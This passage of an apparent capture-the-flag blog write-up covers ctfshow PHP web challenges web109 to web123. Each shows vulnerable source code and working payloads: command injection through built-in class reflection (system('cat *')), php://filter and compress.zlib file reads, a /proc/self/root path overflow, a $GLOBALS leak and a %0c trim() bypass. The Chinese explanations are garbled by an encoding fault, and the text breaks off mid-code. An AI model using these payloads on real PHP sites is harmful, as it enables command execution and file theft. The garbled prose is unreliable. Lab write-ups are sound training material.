æ¯çš„å­—ç¬¦æ˜¯å¤§å°å†™æ•æ„Ÿçš„ã€‚</p><p>ç»“åˆereg()å‡½æ•°ç”¨æ³•ï¼Œæœç´¢ä¸åˆ°æŒ‡å®šå­—ç¬¦ä¸²å°±ä¼šè¿”å›FALSE</p><p>æ‰€ä»¥è¦è®©cä¸­æœ‰å­—æ¯ï¼Œä½†ä¸èƒ½å‡ºç°å…¶ä»–ä¸œè¥¿</p><p>ereg å‡½æ•°å­˜åœ¨ NULL æˆªæ–­æ¼æ´ï¼Œå¯ä»¥ç»•è¿‡æ­£åˆ™è¿‡æ»¤ï¼Œä½¿ç”¨ %00 æˆªæ–­ã€‚</p><p>0x36dï¼Œè½¬åè¿›åˆ¶æ˜¯877ã€‚</p><p>Payload:<code>c=a%00778</code></p><h4 id="web109-phpå†…ç½®ç±»çš„ä½¿ç”¨"><a href="#web109-phpå†…ç½®ç±»çš„ä½¿ç”¨" class="headerlink" title="web109(phpå†…ç½®ç±»çš„ä½¿ç”¨)"></a>web109(phpå†…ç½®ç±»çš„ä½¿ç”¨)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[a-zA-Z]+/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> </code></pre><p>çœ‹åˆ°echo newå°è¯•åå°„ç±»</p><p>Payloadï¼š</p><blockquote><p>?v1&#x3D;Reflectionclass&amp;v2&#x3D;system(â€˜tac fl36dg.txtâ€™)</p><p>?v1&#x3D;Exception&amp;v2&#x3D;system(â€˜cat *â€™)  å¼‚å¸¸å¤„ç†</p><p>?v1&#x3D;class{ public function __construct(){ system(â€˜lsâ€™); } };&amp;v2&#x3D;a  ç”¨åŒ¿åç±»ç»•è¿‡ </p></blockquote><p>v1&#x3D;å†…ç½®ç±»&amp;v2&#x3D;system(â€˜lsâ€™)å³å¯ phpä¸­ä¼šå…ˆæ‰§è¡Œlså‘½ä»¤ç„¶åæŠŠç»“æœä½œä¸ºå‚æ•°å†æ‰§è¡Œä½†lsçš„ç»“æœå·²ç»è¢«è¾“å‡ºäº†</p><h4 id="web110-FilesystemIterator-class"><a href="#web110-FilesystemIterator-class" class="headerlink" title="web110(FilesystemIterator class)"></a>web110(FilesystemIterator class)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo new <span class="token interpolation"><span class="token variable">$v1</span></span>(<span class="token interpolation"><span class="token variable">$v2</span></span>());"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </code></pre><p>[The FilesystemIterator class](<a href="https://www.php.net/manual/zh/class.filesystemiterator.php">PHP: FilesystemIterator - Manual</a>)</p><p>phpå†…ç½®ç±» åˆ©ç”¨ FilesystemIterator è·å–æŒ‡å®šç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶</p><p>Payload:<code>?v1=FilesystemIterator&amp;v2=getcwd</code></p><h4 id="web111-GLOBALS"><a href="#web111-GLOBALS" class="headerlink" title="web111(GLOBALS)"></a>web111(GLOBALS)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token operator">&amp;</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$$v1</span></span> = &amp;<span class="token interpolation"><span class="token variable">$$v2</span></span>;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$$v1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$v1</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v1'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$v2</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'v2'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\"|\'|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\>/'</span><span class="token punctuation">,</span> <span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error v2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow/'</span><span class="token punctuation">,</span> <span class="token variable">$v1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token function">getFlag</span><span class="token punctuation">(</span><span class="token variable">$v1</span><span class="token punctuation">,</span><span class="token variable">$v2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span> </span></code></pre><p>æ³¨æ„ PHP çš„å‡½æ•°å…·æœ‰è¯æ³•ä½œç”¨åŸŸ</p><p>åœ¨å‡½æ•°å†…éƒ¨æ— æ³•è°ƒç”¨å¤–éƒ¨çš„å˜é‡ï¼Œé™¤éè¿›è¡Œä¼ å‚ã€‚è¿™é“é¢˜æ— éæ³¨æ„ä»¥ä¸‹å‡ ç‚¹ï¼š</p><ol><li>æˆ‘ä»¬æœ€ç»ˆè¦å¾—åˆ° $flag çš„å€¼ï¼Œå°±éœ€è¦ var_dump($$v1) ä¸­çš„ $v1 ä¸º flagï¼Œå³ $v2 è¦ä¸º flagï¼Œè¿™æ · $$v2 å°±ä¸º $flagï¼Œ&amp;$$v2 å°±ä¸º $flag å¯¹åº”çš„å€¼</li><li>URL ä¼ å‚æ—¶ $v2 ä¸èƒ½ç›´æ¥ä¼ ä¸º flagï¼Œå¦åˆ™ $flag ä¼šå› â€œå‡½æ•°å†…éƒ¨æ— æ³•è°ƒç”¨å¤–éƒ¨å˜é‡â€çš„é™åˆ¶è€Œå¯¼è‡´å…¶è¿”å› null</li><li>è¦æƒ³è·¨è¿‡è¯æ³•ä½œç”¨åŸŸçš„é™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ GLOBALS å¸¸é‡æ•°ç»„ï¼Œå…¶ä¸­åŒ…å«äº† $flag é”®å€¼å¯¹ï¼Œå°±å¯ä»¥å°† $flag çš„å€¼èµ‹ç»™ $$v1</li></ol><p>Payloadï¼š<code>?v1=ctfshow&amp;v2=GLOBALS</code></p><h4 id="web112-is-file"><a href="#web112-is-file" class="headerlink" title="web112(is_file)"></a>web112(is_file)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\.\.\/|http|https|data|input|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </code></pre><p>è¦æ±‚ä¼ å…¥çš„fileä¸æ˜¯æ–‡ä»¶ï¼Œä½†è¿˜èƒ½highlight_fileï¼Œè¿™å°±è¦è¯´æ˜is_fileå’Œhighlight_fileå¯¹äºæ–‡ä»¶çš„åˆ¤æ–­ï¼šis_fileè®¤ä¸ºä¼ªåè®®ä¸æ˜¯æ–‡ä»¶ï¼Œhighlight_fileè®¤ä¸ºä¼ªåè®®æ˜¯æ–‡ä»¶ï¼Œæ‰€ä»¥è¿™é‡Œä¼ å…¥filterä¼ªåè®®å³å¯ã€‚</p><p>Payload:</p><blockquote><p>php:&#x2F;&#x2F;filter&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;convert.iconv.UCS-2LE.UCS-2BE&#x2F;resource&#x3D;flag.php<br>php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.quoted-printable-encode&#x2F;resource&#x3D;flag.php<br>compress.zlib:&#x2F;&#x2F;flag.php</p></blockquote><p><a href="https://www.novel.tools/decode/UCS-2BE">UCS-2BE Text Decoder</a></p><h4 id="web113"><a href="#web113" class="headerlink" title="web113"></a>web113</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/filter|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>1.åˆ©ç”¨å‡½æ•°æ‰€èƒ½å¤„ç†çš„é•¿åº¦é™åˆ¶è¿›è¡Œç›®å½•æº¢å‡ºï¼š åŸç†ï¼š&#x2F;proc&#x2F;self&#x2F;rootä»£è¡¨æ ¹ç›®å½•ï¼Œè¿›è¡Œç›®å½•æº¢å‡ºï¼Œè¶…è¿‡is_fileèƒ½å¤„ç†çš„æœ€å¤§é•¿åº¦å°±ä¸è®¤ä¸ºæ˜¯ä¸ªæ–‡ä»¶äº†ã€‚ payload: <code>file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/ self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se lf/root/proc/self/root/var/www/html/flag.php</code></p><p>2.åˆ©ç”¨phpä¸­zipä¼ªåè®® ç”¨æ³•[æºäºphpå®˜æ–¹æä¾›çš„ä¸€äº›ä¾‹å­]ï¼š compress.zlib:&#x2F;&#x2F;file.gz compress.zlib:&#x2F;&#x2F;file.bz2 payload: <code>file=compress.zlib://flag.php</code></p><h4 id="web114"><a href="#web114" class="headerlink" title="web114"></a>web114</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i'</span><span class="token punctuation">,</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token variable">$file</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"å¸ˆå‚…ä»¬å±…ç„¶tqléƒ½æ˜¯éé¢„æœŸ å“¼ï¼"</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>æŠŠfilteræ”¾å‡ºæ¥äº†ï¼Œç›´æ¥è¯»</p><h4 id="web115-fç»•è¿‡is-numberic-trim"><a href="#web115-fç»•è¿‡is-numberic-trim" class="headerlink" title="web115(\fç»•è¿‡is_numberic()+trim())"></a>web115(\fç»•è¿‡is_numberic()+trim())</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$num</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!"</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hacker!!!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>trim()</strong> å‡½æ•°ç§»é™¤å­—ç¬¦ä¸²ä¸¤ä¾§çš„ç©ºç™½å­—ç¬¦æˆ–å…¶ä»–é¢„å®šä¹‰å­—ç¬¦ã€‚</p><p>ä¸€èˆ¬æ˜¯ç”¨æ¥å»é™¤å­—ç¬¦ä¸²é¦–å°¾å¤„çš„ç©ºç™½å­—ç¬¦ï¼ˆæˆ–è€…å…¶ä»–å­—ç¬¦ï¼‰ï¼Œä¸€èˆ¬åœ¨ç”¨åœ¨æœåŠ¡ç«¯å¯¹æ¥æ”¶çš„ç”¨æˆ·æ•°æ®è¿›è¡Œå¤„ç†ï¼Œä»¥å…æŠŠç”¨æˆ·è¯¯è¾“å…¥çš„ç©ºæ ¼å­˜å‚¨åˆ°æ•°æ®åº“ï¼Œä¸‹æ¬¡å¯¹æ¯”æ•°æ®æ—¶å€™å‡ºé”™ã€‚</p><p>filterè®©æˆ‘ä»¬æ²¡æ³•è½¬è¿›åˆ¶ç»•è¿‡ï¼Œè¿™é“é¢˜çš„å…³é”®åœ¨äºå¦‚ä½•ç»•è¿‡trimï¼Œæ¨æµ‹éœ€è¦ç‰¹æ®Šå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å†™ä¸ªè„šæœ¬fuzzä¸€ä¸‹ï¼š</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0x"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"0"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"e"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"+"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"1"</span><span class="token punctuation">,</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token variable">$num</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">129</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$num</span><span class="token operator">=</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$num</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string single-quoted-string">'36'</span> <span class="token keyword">and</span> <span class="token function">filter</span><span class="token punctuation">(</span><span class="token variable">$num</span><span class="token punctuation">)</span><span class="token operator">==</span><span class="token string single-quoted-string">'36'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span></span></code></pre><p>Payload:<code>?num=%0c36</code></p><p>trimå‡½æ•°ä¼šè¿‡æ»¤ç©ºæ ¼ä»¥åŠ<code>\n\r\t\v\0</code>ï¼Œä½†ä¸ä¼šè¿‡æ»¤<code>\f</code></p><h4 id="web123-ä¸‹åˆ’çº¿-ç»•è¿‡"><a href="#web123-ä¸‹åˆ’çº¿-ç»•è¿‡" class="headerlink" title="web123(ä¸‹åˆ’çº¿_ç»•è¿‡)"></a>web123(ä¸‹åˆ’çº¿_ç»•è¿‡)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string 